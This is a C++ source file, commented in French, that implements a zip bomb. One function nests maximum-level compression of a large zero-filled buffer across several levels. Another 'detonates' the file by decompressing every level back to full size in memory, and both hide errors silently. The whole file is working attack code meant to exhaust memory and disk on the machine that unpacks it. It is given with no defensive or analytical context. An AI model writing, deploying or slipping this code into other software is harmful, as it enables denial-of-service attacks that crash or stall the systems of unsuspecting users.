//
// Zip Bomb implementation
// Compatible GCC 4.4.7
//
#include "zipbomb.h"
#include "../packer/Compressor.h"
#include <iostream>
#include <fstream>
#include <vector>

// Crée une "zip bomb"
void create_zipbomb(const char* filename, unsigned long size_mb, int levels) {
    const unsigned long total_size = size_mb * 1024 * 1024;
    std::vector<unsigned char> data(total_size, 0);
    
    try {
        std::vector<unsigned char> compressed = Compressor::compress(data, 9);
        
        data.clear();
        std::vector<unsigned char>().swap(data);
        
        for (int level = 2; level <= levels; ++level) {
            std::vector<unsigned char> next_level = Compressor::compress(compressed, 9);
            compressed.clear();
            compressed = next_level;
        }
        
        std::ofstream out(filename, std::ios::binary);
        if (out) {
            out.write(reinterpret_cast<const char*>(&compressed[0]), compressed.size());
            out.close();
        }
        
    } catch (const std::exception& e) {
        // Silent
    }
}

// Déclenche la zip bomb
void detonate_zipbomb(const char* filename, int levels, unsigned long expected_size) {
    try {
        std::ifstream in(filename, std::ios::binary);
        if (!in) {
            return;
        }
        
        std::vector<unsigned char> compressed_data(
            (std::istreambuf_iterator<char>(in)),
            std::istreambuf_iterator<char>()
        );
        in.close();
        
        std::vector<unsigned char> current = compressed_data;
        
        for (int level = levels; level >= 1; --level) {
            unsigned long estimated_size = current.size() * 1000;
            if (level == 1) {
                estimated_size = expected_size;
            }
            
            std::vector<unsigned char> decompressed = Compressor::decompress(current, estimated_size);
            current = decompressed;
        }
        
    } catch (const std::exception& e) {
        // Silent
    }
}
